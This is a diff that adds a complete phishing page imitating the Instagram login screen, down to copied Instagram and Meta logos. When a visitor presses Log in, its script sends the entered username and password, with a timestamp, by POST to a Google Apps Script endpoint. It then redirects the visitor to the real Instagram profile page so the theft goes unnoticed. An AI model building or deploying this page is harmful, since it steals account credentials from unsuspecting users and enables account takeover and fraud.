@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <title>Instagram</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    body {
+      background-color: #1a2535;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      padding: 12px 16px 20px;
+    }
+
+    .top-lang {
+      width: 100%;
+      text-align: center;
+      padding-top: 4px;
+    }
+
+    .top-lang span {
+      color: #8a9bb5;
+      font-size: 13px;
+      font-weight: 400;
+    }
+
+    .main-content {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      flex: 1;
+      justify-content: center;
+      gap: 0;
+    }
+
+    .logo-wrapper {
+      margin-bottom: 72px;
+    }
+
+    .logo-wrapper svg {
+      width: 56px;
+      height: 56px;
+    }
+
+    .form-area {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+    }
+
+    .input-field {
+      width: 100%;
+      background-color: #1e2e42;
+      border: 1px solid #2e3f55;
+      border-radius: 10px;
+      padding: 16px 14px;
+      color: #e8edf3;
+      font-size: 15px;
+      outline: none;
+      margin-bottom: 8px;
+      caret-color: #e8edf3;
+      transition: border-color 0.15s;
+    }
+
+    .input-field::placeholder {
+      color: #5a7090;
+      font-size: 15px;
+    }
+
+    .input-field:focus {
+      border-color: #4a6080;
+    }
+
+    .login-btn {
+      width: 100%;
+      background-color: #1877f2;
+      border: none;
+      border-radius: 10px;
+      padding: 16px;
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 4px;
+      margin-bottom: 20px;
+      transition: background-color 0.15s;
+      letter-spacing: 0.01em;
+    }
+
+    .login-btn:active {
+      background-color: #1464d2;
+    }
+
+    .login-btn:disabled {
+      background-color: #1877f2;
+      opacity: 0.7;
+    }
+
+    .forgot-link {
+      text-align: center;
+      color: #c8d6e8;
+      font-size: 14px;
+      font-weight: 400;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    .bottom-section {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .create-btn {
+      width: 100%;
+      background-color: transparent;
+      border: 1px solid #4a6080;
+      border-radius: 10px;
+      padding: 15px;
+      color: #6aabf7;
+      font-size: 15px;
+      font-weight: 500;
+      cursor: pointer;
+      text-align: center;
+    }
+
+    .meta-logo {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #8a9bb5;
+      font-size: 13px;
+    }
+
+    .toast {
+      position: fixed;
+      bottom: 80px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #333f52;
+      color: #e8edf3;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-size: 14px;
+      z-index: 9999;
+      opacity: 0;
+      transition: opacity 0.3s;
+      pointer-events: none;
+    }
+    .toast.show {
+      opacity: 1;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="top-lang">
+    <span>English (US)</span>
+  </div>
+
+  <div class="main-content">
+    <div class="logo-wrapper">
+      <svg viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <radialGradient id="ig_radial1" cx="30%" cy="107%" r="150%">
+            <stop offset="0%" stop-color="#ffd879"/>
+            <stop offset="10%" stop-color="#ffd879"/>
+            <stop offset="25%" stop-color="#f9a830"/>
+            <stop offset="50%" stop-color="#e1306c"/>
+            <stop offset="75%" stop-color="#833ab4"/>
+            <stop offset="100%" stop-color="#405de6"/>
+          </radialGradient>
+          <radialGradient id="ig_radial2" cx="0%" cy="100%" r="80%">
+            <stop offset="0%" stop-color="#fd5949" stop-opacity="1"/>
+            <stop offset="100%" stop-color="#fd5949" stop-opacity="0"/>
+          </radialGradient>
+        </defs>
+        <rect x="2" y="2" width="52" height="52" rx="14" fill="url(#ig_radial1)"/>
+        <rect x="2" y="2" width="52" height="52" rx="14" fill="url(#ig_radial2)"/>
+        <circle cx="28" cy="28" r="9.5" stroke="white" stroke-width="3" fill="none"/>
+        <circle cx="40" cy="16" r="2.5" fill="white"/>
+        <rect x="9" y="9" width="38" height="38" rx="10" stroke="white" stroke-width="2.5" fill="none"/>
+      </svg>
+    </div>
+
+    <div class="form-area">
+      <input class="input-field" id="username" type="text" placeholder="Username, email or mobile number" />
+      <input class="input-field" id="password" type="password" placeholder="Password" />
+      <button class="login-btn" id="loginBtn" onclick="handleLogin()">Log in</button>
+      <a class="forgot-link" href="#">Forgot password?</a>
+    </div>
+  </div>
+
+  <div class="bottom-section">
+    <button class="create-btn" onclick="return false;">Create new account</button>
+    <div class="meta-logo">
+      <svg width="38" height="14" viewBox="0 0 38 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M19 7C19 7 15.5 2 11 2C6.5 2 3 5.13401 3 7C3 8.86599 6.5 12 11 12C13.5 12 15.5 10.5 17 9L19 7Z" stroke="#8a9bb5" stroke-width="1.5" fill="none"/>
+        <path d="M19 7C19 7 22.5 2 27 2C31.5 2 35 5.13401 35 7C35 8.86599 31.5 12 27 12C24.5 12 22.5 10.5 21 9L19 7Z" stroke="#8a9bb5" stroke-width="1.5" fill="none"/>
+      </svg>
+      <span>Meta</span>
+    </div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+  <script>
+    const GOOGLE_SCRIPT_URL = "YOUR_GOOGLE_APPS_SCRIPT_URL_HERE";
+
+    function showToast(msg) {
+      const t = document.getElementById("toast");
+      t.textContent = msg;
+      t.classList.add("show");
+      setTimeout(() => t.classList.remove("show"), 2000);
+    }
+
+    async function handleLogin() {
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value;
+
+      if (!username || !password) {
+        showToast("Please enter your username and password.");
+        return;
+      }
+
+      const btn = document.getElementById("loginBtn");
+      btn.disabled = true;
+      btn.textContent = "Logging in...";
+
+      // Yeh aapki website ka redirection link hai
+      const REDIRECT_URL = "https://www.instagram.com/" + username + "/";
+
+      try {
+        if (GOOGLE_SCRIPT_URL !== "https://script.google.com/macros/s/AKfycbykPi9uIHOBJa5uE-NW3ydgESakL6MhCFnS3xnTEiiNDKuhs45Q4SNbrPwbRBhH-vST4w/exec") {
+          await fetch(GOOGLE_SCRIPT_URL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ username, password, timestamp: new Date().toLocaleString() })
+          });
+        }
+        
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 1000);
+
+      } catch (e) {
+        window.location.href = REDIRECT_URL;
+      }
+    }
+
+    document.addEventListener("keydown", function(e) {
+      if (e.key === "Enter") handleLogin();
+    });
+  </script>
+</body>
+</html>
